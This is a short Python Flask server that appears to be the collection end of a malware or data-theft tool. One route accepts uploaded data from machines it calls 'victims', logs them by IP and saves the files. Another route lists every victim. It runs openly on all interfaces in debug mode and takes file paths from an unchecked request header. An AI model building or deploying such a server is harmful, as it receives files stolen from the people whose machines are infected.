from flask import Flask, request, jsonify
from api.models.victim import Victim
from api.models.encryption import Encryption


app = Flask(__name__)

crypt = Encryption()

@app.route("/up", methods=["POST"])
def up():
    CurrentVictim = Victim(request.remote_addr)
    NameHeader = request.headers.get("name")
    FilePath = CurrentVictim.GetFileStoragePath(NameHeader)

    dataout = open(FilePath, 'wb')
    dataout.write(request.data)
    dataout.close()

    return '', 200


@app.route("/GetAll", methods=["GET"])
def GetAll():
    """
    Get all victims

    return:
        List[dict] = list of dicts each contains information about victim's info
    """

    return jsonify(Victim(None).AllVictims)


if __name__ == '__main__':
    app.run(host="0.0.0.0", port=1133, debug=True)
